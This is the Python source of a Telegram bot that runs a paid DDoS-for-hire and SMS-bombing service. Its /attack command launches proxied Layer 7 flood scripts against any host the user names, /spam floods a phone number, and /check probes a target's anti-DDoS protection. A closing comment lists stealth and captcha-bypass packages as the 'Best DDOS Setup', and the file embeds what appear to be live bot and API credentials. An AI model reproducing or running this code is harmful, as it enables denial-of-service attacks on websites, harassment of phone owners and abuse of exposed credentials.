import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import shutil
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
import schedule

# Uptime PART
from server import alive
alive()


bot_token = '6508337693:AAEy5Vlirw5hPG2EWW3wP7bEYrltfhhhW-U' 
bot = telebot.TeleBot(bot_token)

allowed_users = []
processes = []
ADMIN_ID = 5111191060
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'This command only for Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Use correct syntax /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Added user with ID: {user_id} Can now use the DDOS Attack for 30 days')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=65d3579b9b102a50be24752b&url=https://viduchung.info/key/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Error, please use again command /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "Error, please use again command /getkey"
    
    text = f'''
━➤ Done Get Key
━➤ Follow this link to get your Key: {url_key}
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Please enter your key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Key accepted! You now can order an attack!')
    else:
        bot.reply_to(message, 'Wrong key or expired\nDo not use others key!')
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''  
[ 🗝️ ] Key panel
 - /getkey : To get free key
 - /key <key> : To enter free key

[ ⚡ ] Attack panel
 - /methods : To see list of DDOS/SpamSMS methods
 - /spam <phone number> : Start phone spam
 - /attack <method> <target> <time> : Perfrom a DDOS attack

[ 🔧 ] Tools panel
 - /check <target> : Check Protect system of target ( Lack of % )
 - /code <target> : Get target source code
 - /proxy : Control bot proxies
 - /time : Get bot uptime data
 - /admin : See Admin activity

[ 👨‍💻 ] Admin Permission
 - /add [id] : Add user to the bot plan
 - /cpu : See BOT CPU Stats
 - /on : Turn on maintenance
 - /off : Turn off maintenance
'''
    image_path = 'BB/help.png'
    with open(image_path, 'rb') as image_file:
        bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=help_text, reply_to_message_id=message.message_id)
@bot.message_handler(commands=['tmute'])
def tmute(message):
    pass
@bot.message_handler(commands=['muakey'])
def muakey(message):
    pass
@bot.message_handler(commands=['nhapkey'])
def nhapkeyvip(message):
    pass
@bot.message_handler(commands=['vip'])
def vipsms(message):
    pass
@bot.message_handler(commands=['ddos'])
def didotv(message):
    pass
@bot.message_handler(commands=['setflood'])
def aygspws(message):
    pass
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
[ 👑 ]   All Layer7 Methods ! 
     - PLUTO
     - VOIDLASH
     - CYCLONIC
     - FRIXIZ
     - OPIUM
     - GLAXIA
     - POSEIDON
     - ZENITH

[ ⚜️ ]   All Layer4 Methods !
     - UDP
     - TCP-KILLER

[ 💎 ]   Spam SMS
     - /spam <phone number>

[ 📎 ]   ATTACK ?\n Layer 7 | /attack [ method ] [ host ]\n Layer 4 | /attack [ method ] [ ip ] [ port ]
'''
    image_path = 'BB/methods.png'
    with open(image_path, 'rb') as image_file:
        bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=help_text, reply_to_message_id=message.message_id)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    # Convert duration from string to float
    duration = float(duration)
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= duration:
                cmd_process.terminate()
                os.chdir('..')
                bot.reply_to(message, "[ 💤 ]   Attack Stopped.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key\nBuy your own key: @prifxz')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, '[ 👻 ]   How to attack:\n Layer 7 | /attack [method] [host]\n [ Maintenace ] Layer 4 | /attack [method] [ip] [port] ')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username}! Please wait {remaining_time}s To use the command again!")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    #Attack Area
    blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM' or method == 'VOIDLASH' or method == 'CYCLONIC':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"[ 🚀 ]  Cannot perform the attack | Blocked domain: {blocked_domain}")
                return

    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM', 'VOIDLASH', 'CYCLONIC']:
        # Update the command and duration based on the selected method
        if method == 'PLUTO':
            os.chdir("L7")
            command = ["node", "Pluto.js", host, "60", "64", "14", "proxy.txt", "bypass"]
            duration = 60
        if method == 'CYCLONIC':
            os.chdir("L7")
            command = ["node", "Cyclonic.js", host, "60", "64", "12", "proxy.txt"]
            duration = 60
        if method == 'VOIDLASH':
            os.chdir("L7")
            command = ["node", "Voidlash.js", host, "60", "14", "proxy.txt", "14", "10"]
            duration = 60
        elif method == 'POSEIDON':
            os.chdir("L7")
            command = ["node", "Poseidon.js", host, "60", "12", "proxy.txt", "autorate"]
            duration = 60
        elif method == 'OPIUM':
            os.chdir("L7")
            command = ["node", "Opium.js", host, "60", "100", "12", "GET", "proxy.txt"]
            duration = 60
        elif method == 'ZENITH':
            os.chdir("L7")
            command = ["node", "Zenith.js", host, "60", "100", "12", "proxy.txt"]
            duration = 60
        elif method == 'FRIXIZ':
            os.chdir("L7")
            command = ["node", "Frixiz.js", host, "60", "15", "12", "proxy.txt"]
            duration = 60
        elif method == 'GLAXIA':
            os.chdir("L7")
            command = ["node", "Glaxia.js", host, "60", "64", "12", "proxy.txt"]
            duration = 60
   #     elif method == 'UDP-FLOOD':
   #         if not port.isdigit():
   #             bot.reply_to(message, 'Port phải là một số nguyên dương.')
   #             return
   #         os.chdir("L4")
   #         command = ["python", "udp.py", host, port, "120", "64", "35"]
   #         duration = 120
   #     elif method == 'TCP-KILL':
   #         if not 60.isdigit():
   #             bot.reply_to(message, 'Port must be a positive number.')
   #             return
   #         os.chdir("L4")
   #         command = ["python", "tcp.py", host, port, "1000", "12", 60]
   #         duration = 60

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        if attack_thread.start:
            attacksent = f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n  - Method: {method}\n  - Cooldown: 150s\n  ┗➤ Plan: VIP\n[ 💎 ]  Buy Plan/Script dms @prifxz'
            image_path = '/workspaces/telegram/BB/attacksent.png'
            with open(image_path, 'rb') as image_file:
                bot.send_photo(chat_id=message.chat.id, photo=image_file, caption=attacksent, reply_to_message_id=message.message_id)
        else:
            bot.reply_to(message, 'Attack Not Individual Methods. Please use /methods to see attacking methods!')


@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("L7/proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Total Proxies: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Cannot find proxy.txt.")
    else:
        bot.reply_to(message, 'Please apply your key\nPlease use /getkey to get your own key')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Total proxied updated: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You dont have permission to use this command..')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You dont have permission to use this command..')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'The bot has entered maintenance mode. Everyone will now not be able to use the bot')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You dont have permission to use this command..')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Maintenance mode has ended. Everyone can use it normally again')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you  have any issues')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please use correct syntax.\nExample: /code + [target]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Cannot get this website source code. Please check the input again!')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'The website is not HTML or PHP. Please try with a website URL containing HTML or PHP files.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Error: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please use correct syntax.\nExample: /check + [target]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Target : {url}\nIPs: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "This website may not have AntiDDOS system"
        else:
            reply += "This website may have a great AntiDDOS system"

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/prifxz")

# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} hour(s), {minutes} minute(s), {seconds} secs'
    bot.reply_to(message, f'Uptime: {uptime_str}')

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_sms(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "[ 💤 ]   Attack Stopped.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return


@bot.message_handler(commands=['spam'])
def attack_command(message):
    user_id = message.from_user.id
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently under maintenace. Be patient\nContact @prifxz if you have any issues')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please apply your key\nPlease use /getkey to get your own key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Please use the correct syntax.\nExample: /spam <phone number>')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Cannot spam this numbers.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 200:
        remaining_time = int(200 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Please wait {remaining_time}s To use the command again!')
        return
    
    cooldown_dict[user_id] = time.time()

    # Define the attack command and duration here
    os.chdir("L4")
    command = ["python", "sms.py", phone_number, "120"]
    duration = 120

    attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
    attack_thread.start()
    bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by @{username}\n  - Target: {phone_number}\n  - Duration: 120s\n - Method: Phone Bulk\n  - Cooldown: 200s\n  ┗➤ Plan: VIP')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Invalid command! Please use the /help command to see the command list.')

def update_proxies():
    try:
        print("Updating proxies...")
        os.chdir("/workspaces/telegram/AA")  # Change directory to the folder containing proxy.py
        subprocess.run(["python", "proxy.py"])  # Assuming proxy.py is your script to update proxies
        os.chdir("..")  # Change back to the main directory
        time.sleep(30)  # Wait for 30 seconds
        os.chdir("/workspaces/telegram/AA")
        subprocess.run(["python", "check.py", "needtocheck.txt"])  # Assuming check.py is your script to check proxies
        os.chdir("..")
        print("Check process completed.")  # Indicate when the check process is completed
        proxy_file_path = os.path.join("/workspaces/telegram/AA", "proxy.txt")
        if os.path.exists(proxy_file_path):  # Check if proxy.txt file exists
            print("Proxy file found. Copying and replacing...")  # Indicate when copying and replacing begins
            shutil.copy(proxy_file_path, "/workspaces/telegram/L7/proxy.txt")  # Copy and replace proxy file
            print("Proxy file copied and replaced successfully.")
        else:
            print("Proxy file not found. Skipping copying and replacing.")
    except FileNotFoundError:
        print("Cannot find proxy.py or check.py.")

def schedule_update():
    # Schedule the proxy update task every 10 minutes
    schedule.every(10).minutes.do(update_proxies)

    # Run the scheduler in a loop
    while True:
        schedule.run_pending()
        time.sleep(1)

def start_bot():
    # Start the bot's event loop
    bot.infinity_polling(timeout=60, long_polling_timeout=1)

if __name__ == "__main__":
    # Create threads for bot and scheduler
    bot_thread = threading.Thread(target=start_bot)
    #scheduler_thread = threading.Thread(target=schedule_update)

    # Start both threads
    bot_thread.start()
    #scheduler_thread.start()

    # Wait for both threads to finish
    bot_thread.join()
    #scheduler_thread.join()




# npm i user-agents header-generator request fake-useragent randomstring colors axios cheerio gradient-string cloudscraper random-useragent crypto-random-string playwright-extra fingerprint-generator fingerprint-injector ua-parser-js http2 minimist socks puppeteer hcaptcha-solver puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth http http2 zombie random-referer jar xmlhttprequest vm set-cookie-parser
# Best DDOS Setup